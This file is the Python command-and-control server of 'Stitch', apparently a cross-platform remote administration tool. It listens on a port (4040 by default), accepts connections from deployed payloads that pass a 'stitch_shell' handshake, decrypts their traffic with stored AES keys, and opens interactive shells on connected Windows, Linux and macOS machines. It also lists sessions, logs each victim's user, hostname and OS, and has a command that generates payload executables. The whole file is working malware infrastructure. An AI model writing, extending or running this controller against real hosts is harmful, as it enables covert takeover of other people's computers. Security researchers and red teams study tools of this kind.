#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import stitch_winshell
import stitch_osxshell
import stitch_lnxshell
from stitch_gen import *
from stitch_help import *
from stitch_utils import *

class stitch_server(cmd.Cmd):
    inf_sock = {}
    inf_port = {}
    inf_name = {}

    listen_port = None
    server_thread = None

    def __init__(self):
        cmd.Cmd.__init__(self)
        path_name = get_cwd()
        self.Config = ConfigParser.ConfigParser()
        self.Config.read(hist_ini)
        self.aes_lib = ConfigParser.ConfigParser()
        self.aes_lib.read(st_aes_lib)
        self.prompt = "{} {} ".format(st_tag,path_name)
        display_banner()

    def ConfigSectionMap(self, section):
        dict1 = {}
        options = self.Config.options(section)
        for option in options:
            try:
                dict1[option] = self.Config.get(section, option)
                if dict1[option] == -1:
                    pass
            except:
                print("exception on {}!".format(option))
                dict1[option] = None
        return dict1

    def AESLibMap(self, section):
        dict1 = {}
        options = self.aes_lib.options(section)
        for option in options:
            try:
                dict1[option] = self.aes_lib.get(section, option)
                if dict1[option] == -1:
                    pass
            except:
                print("exception on {}!".format(option))
                dict1[option] = None
        return dict1

    def display_history(self):
        self.Config.read(hist_ini)
        history_title = "=== Connection History ==="
        st_print(history_title)
        for n in self.Config.sections():
            n_target = n
            n_port = self.ConfigSectionMap(n)['port']
            n_user = self.ConfigSectionMap(n)['user']
            n_os = self.ConfigSectionMap(n)['os']
            n_hostname = self.ConfigSectionMap(n)['hostname']
            print_cyan('\n{}'.format(n))
            print_border(len(n),'-')
            print('   User: {}\n   Hostname: {}\n   Listening Port: {}\n'
            '   Operating System: {}\n'.format( n_user, n_hostname, n_port, n_os))
        print ""

    def remove_hsection(self,section):
        if section in self.Config.sections():
            self.cfgfile = open(hist_ini,'wb')
            self.Config.remove_section(section)
            self.Config.write(self.cfgfile)
            self.cfgfile.close()
            st_print('[+] Successfully removed {} from your history.\n'.format(section))
        else:
            st_print('[!] Could not find {} in your history.\n'.format(section))

    def default(self, line):
        st_log.info('Stitch cmd command: "{}"'.format(line))
        st_print(run_command(line))

    def run_server(self):
        client_socket=None
        self.server_running = True
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind(('',self.l_port))
            server.listen(10)
            self.listen_port = self.l_port
        except Exception as e:
            self.server_thread='Failed'
            return
        self.server_thread = threading.currentThread()
        while True:
            if not self.server_running:
                break
            try:
                server.settimeout(2)
                client_socket, addr = server.accept()
            except Exception as e:
                pass
            if client_socket:
                self.inf_sock[addr[0]] = client_socket
                self.inf_port[addr[0]] = addr[1]
                st_print('[+] New successful connection from {}\n'.format(addr))
                client_socket = None
        server.close()
        for n in self.inf_sock: self.inf_sock[n].close()
        self.inf_sock={}
        self.inf_port={}
        self.listen_port=None
        self.server_thread=None

    def stop_server(self):
        self.server_running=False

    def recvall(self,sock,count,encryption=True):
        buf = b''
        while count:
            newbuf = sock.recv(count)
            if not newbuf: return None
            if not encryption:
                buf += newbuf
            else:
                buf += decrypt(newbuf, self.aes_enc)
            count -= len(newbuf)
        return buf

    def receive(self,sock,encryption=True):
        full_response = ""
        while True:
            lengthbuf = self.recvall(sock, 4, encryption=False)
            length, = struct.unpack('!i', lengthbuf)
            response = self.recvall(sock, length, encryption=encryption)
            if response != st_eof:
                full_response += response
            else:
                break
        return full_response

################################################################################
#                           Start of DO Section                                #
################################################################################

    def do_addkey(self, line):
        if line:
            add_aes(line)
            self.aes_lib.read(st_aes_lib)
        else:
            usage_addkey()

    def do_cat(self,line):
        if line:
            if windows_client():
                cmd ='more {}'.format(line)
            else:
                cmd = 'cat {}'.format(line)
            st_print(run_command(cmd))
        else:
            usage_cat()

    def do_cd(self, line):
        if line != '':
            try:
                os.chdir(line)
                print
            except Exception as e:
                st_print("[*] {}\n".format(e))
        else:
            self.do_pwd(line)
        self.path_name= get_cwd()
        self.prompt = "{} {} ".format(st_tag,self.path_name)

    def do_cls(self, line):
        clear_screen()

    def do_clear(self, line):
        clear_screen()

    def do_dir(self,line):
        self.do_ls(line)

    def do_history(self, line):
        self.display_history()

    def do_history_remove(self, line):
        if line != '':
            self.remove_hsection(line)
        else:
            usage_history_remove()

    def do_home(self, line):
        display_banner()

    def do_ipconfig(self,line):
        if windows_client():
            cmd = 'ipconfig {}'.format(line)
        else:
            cmd = 'ifconfig {}'.format(line)
        st_print(run_command(cmd))

    def do_ifconfig(self,line):
        self.do_ipconfig(line)

    def do_lsmod(self,line):
        if windows_client():
            cmd = 'driverquery {}'.format(line)
        elif linux_client():
            cmd = 'lsmod {}'.format(line)
        else:
            cmd = 'kextstat {}'.format(line)
        st_print(run_command(cmd))

    def do_ls(self,line):
        if windows_client():
            cmd = 'dir /a {}'.format(line)
        else:
            cmd = 'ls -alh {}'.format(line)
        st_print(run_command(cmd))

    def do_listen(self,line):
        if len(line) < 1:
            usage_listen()
            return
        try:
            self.l_port = int(line)
        except ValueError:
            st_print("[!] ERROR: The port argument {} is not an int.\n".format(line[2]))
            st_print('[*] Usage: listen [port]\n')
            return
        while self.server_thread is not None:
            self.stop_server()
            time.sleep(1)
        server = threading.Thread(target=self.run_server, args=())
        server.daemon = True
        server.start()
        while True:
            if self.server_thread is not None:
                if self.server_thread == 'Failed':
                    st_print("[!] Unable to listen on port {}\n".format(self.l_port))
                    self.server_thread = None
                    break
                elif "Thread" in str(self.server_thread) and "started" in str(self.server_thread):
                    st_print("[+] Now listening on port {}\n".format(self.l_port))
                    break

    def do_more(self,line):
        if line:
            self.do_cat(line)
        else:
            usage_more()

    def do_pwd(self,line):
        st_print('{}\n'.format(os.getcwd()))

    def do_ps(self,line):
        if windows_client():
            cmd = 'tasklist {}'.format(line)
        else:
            cmd = 'ps {}'.format(line)
        st_print(run_command(cmd))

    def do_start(self, line):
        if windows_client():
            cmd = 'start {}'.format(line)
        elif osx_client() and not line:
            cmd = 'open -a Terminal .'
        else:
            cmd = './{} &'.format(line)
        st_print(start_command(cmd))

    def do_sessions(self,line):
        i = 0
        session_title = '=== Connected to port {} ==='.format(self.listen_port)
        st_print(session_title)
        for n in self.inf_sock:
            if n in self.Config.sections():
                n_target = n
                n_user = self.ConfigSectionMap(n)['user']
                n_os = self.ConfigSectionMap(n)['os']
                n_hostname = self.ConfigSectionMap(n)['hostname']
            else:
                n_target = n
                n_user = '----'
                n_os = '----------------'
                n_hostname = '--------'
            print_cyan ('\n{}'.format(n),)
            print_border(len(n),'-')
            print ('   User: {}\n   Hostname: {}\n'
            '   Operating System: {}\n'.format(n_user, n_hostname, n_os))
            i += 1
        print

    def do_shell (self,line):
        if len(line.split()) != 1:
            usage_shell()
        else:
            self.target = line
            if str(self.target) in self.inf_sock:
                self.conn = self.inf_sock[self.target]
                self.port = self.inf_port[self.target]
                del self.inf_sock[self.target]
                del self.inf_port[self.target]
                try:
                    st_confirm = self.receive(self.conn,encryption=False)
                    if st_confirm == base64.b64encode('stitch_shell'):
                        conn_aes = self.receive(self.conn,encryption=False)
                        if conn_aes in self.aes_lib.sections():
                            self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
                            self.aes_enc = base64.b64decode(self.aes_enc)
                            st_log.info('Starting shell on {}:{}'.format(self.target, self.port))
                            st_print('[+] Connection successful from {}:{}'.format(self.target, self.port))
                            target_os = self.receive(self.conn)
                            if no_error(target_os):
                                if windows_client(target_os):
                                    st_print('[*] Starting Windows Shell...\n')
                                    stitch_winshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                elif linux_client(target_os):
                                    st_print('[*] Starting Linux Shell...\n')
                                    stitch_lnxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                elif osx_client(target_os):
                                    st_print('[*] Starting Mac OS X Shell...\n')
                                    stitch_osxshell.start_shell(self.target, self.listen_port,self.conn,self.aes_enc)
                                else:
                                    st.log.error('Unsupported OS: {}'.format(target_os))
                                    st_print('[!] Unsupported OS: {}\n'.format(target_os))
                            else:
                                st_print(target_os)
                        else:
                            st_print('[!] The target connection is using an encryption key not found in the AES library.')
                            st_print('[*] Use the "addkey" command to add encryption keys to the AES library.\n')
                            self.conn.close()
                    else:
                        st_print('[!] Non-stitch application trying to connect.\n')
                        self.conn.close()
                except KeyboardInterrupt:
                    st_print("[-] Disconnected from {}\n".format(self.target))
                    st_log.info('KeyboardInterrupt caused disconnect from {}'.format(self.target))
                    self.conn.close()
                except Exception as e:
                    st_print("[!] Exception!")
                    st_print("[*] {}".format(str(e)))
                    st_log.error('Exception:\n{}'.format(str(e)))
                    st_print("[-] Disconnected from {}\n".format(self.target))
                    self.conn.close()
            else:
                st_print("[!] There are no active connections to {}\n".format(self.target))

    def do_showkey(self,line):
        show_aes()

    def do_stitchgen(self,line):
        cur_dir = os.getcwd()
        os.chdir(configuration_path)
        try:
            run_exe_gen()
        finally:
            os.chdir(cur_dir)

    def do_connect(self,line):
        line = line.split()
        if len(line) < 1 or len(line) > 2:
            usage_connect()
        else:
            self.target = line[0]
            if len(line) == 1:
                self.port = 80
            else:
                try:
                    self.port = int(line[1])
                except ValueError:
                    st_print("[!] ERROR: The port argument {} is not an int.\n".format(line[1]))
                    return
            st_print('[*] Connecting to {} on port {}...'.format(self.target, self.port))
            st_log.info('Trying to connect to {}:{}'.format(self.target, self.port))
            try:
                self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.client.settimeout(8)
                self.client.connect((self.target, self.port))
                st_confirm = self.receive(self.client,encryption=False)
                if st_confirm == base64.b64encode('stitch_shell'):
                    conn_aes = self.receive(self.client,encryption=False)
                    if conn_aes in self.aes_lib.sections():
                        self.aes_enc = self.AESLibMap(conn_aes)['aes_key']
                        self.aes_enc = base64.b64decode(self.aes_enc)
                        st_print('[+] Connection successful.')
                        target_os = self.receive(self.client)
                        if no_error(target_os):
                            if windows_client(target_os):
                                st_print('[*] Starting Windows Shell...\n')
                                stitch_winshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            elif linux_client(target_os):
                                st_print('[*] Starting Linux Shell...\n')
                                stitch_lnxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            elif osx_client(target_os):
                                st_print('[*] Starting OSX Shell...\n')
                                stitch_osxshell.start_shell(self.target, self.port,self.client,self.aes_enc)
                            else:
                                st.log.error('Unsupported OS: {}'.format(target_os))
                                st_print('[!] Unsupported OS: {}\n'.format(target_os))
                        else:
                            st_print(target_os)
                    else:
                        st_print('[!] The target connection is using an encryption key not found in the AES library.')
                        st_print('[*] Use the "addkey" command to add encryption keys to the AES library.\n')
                        self.client.close()
                else:
                    st_print('[!] Non-stitch application trying to connect.\n')
                    self.client.close()
            except KeyboardInterrupt:
                st_print("[-] Disconnected from {}\n".format(self.target))
                st_log.info('KeyboardInterrupt caused disconnect from {}'.format(self.target))
                self.client.close()
            except Exception as e:
                st_print("[!] Exception!")
                st_print("[*] {}".format(e))
                st_log.error('Exception:\n{}'.format(str(e)))
                st_print("[-] Disconnected from {}\n".format(self.target))
                self.client.close()

    def do_touch(self,line):
        if windows_client():
            cmd = 'if not exist {} type NUL > {}'.format(line,line)
        else:
            cmd = 'touch {}'.format(line)
        st_print(run_command(cmd))

    def emptyline(self):
        pass

    def do_exit(self, line=None):
        for n in self.inf_sock: self.inf_sock[n].close()
        st_print("[-] Exiting Stitch...\n")
        return True

    def do_EOF(self, line):
        print
        return self.do_exit(line)

################################################################################
#                        Start of COMPLETE Section                             #
################################################################################

    def complete_cat(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, all_dir=True)

    def complete_cd(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, dir_only = True)

    def complete_dir(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, dir_only = True)

    def complete_ls(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, dir_only = True)

    def complete_more(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, all_dir=True)

    def complete_start(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, all_dir=True)

    def complete_shell(self, text, line, begidx, endidx):
        return find_completion(text,self.inf_sock)

################################################################################
#                        Start of HELP Section                                 #
################################################################################

    def help_addkey(self): st_help_addkey()

    def help_cat(self): st_help_cat()

    def help_cd(self): st_help_cd()

    def help_cls(self): st_help_cls()

    def help_clear(self): st_help_clear()

    def help_connect(self): st_help_connect()

    def help_dir(self): st_help_dir()

    def help_history(self): st_help_history()

    def help_history_remove(self): st_help_history_remove()

    def help_home(self): st_help_home()

    def help_ifconfig(self): st_help_ifconfig()

    def help_ipconfig(self): st_help_ipconfig()

    def help_lsmod(self): st_help_lsmod()

    def help_ls(self): st_help_ls()

    def help_listen(self): st_help_listen()

    def help_more(self): st_help_more()

    def help_pwd(self): st_help_pwd()

    def help_ps(self): st_help_ps()

    def help_start(self): st_help_start()

    def help_sessions(self): st_help_sessions()

    def help_shell(self): st_help_shell()

    def help_showkey(self): st_help_showkey()

    def help_stitchgen(self): st_help_stitchgen()

    def help_touch(self): st_help_touch()

    def help_exit(self): st_help_exit()

    def help_EOF(self): st_help_EOF()


def server_main():
    try:
        st_log.info('Starting Stitch')
        st = stitch_server()
        st.do_listen('4040')
        st.cmdloop()
    except KeyboardInterrupt:
        st_log.info("Exiting Stitch due to a KeyboardInterrupt")
        st.do_exit()
    except Exception as e:
        st_log.info("Exiting Stitch due to an exception:\n{}".format(str(e)))
        st_print("[!] {}\n".format(str(e)))
        st.do_exit()


if __name__ == "__main__":
    server_main()
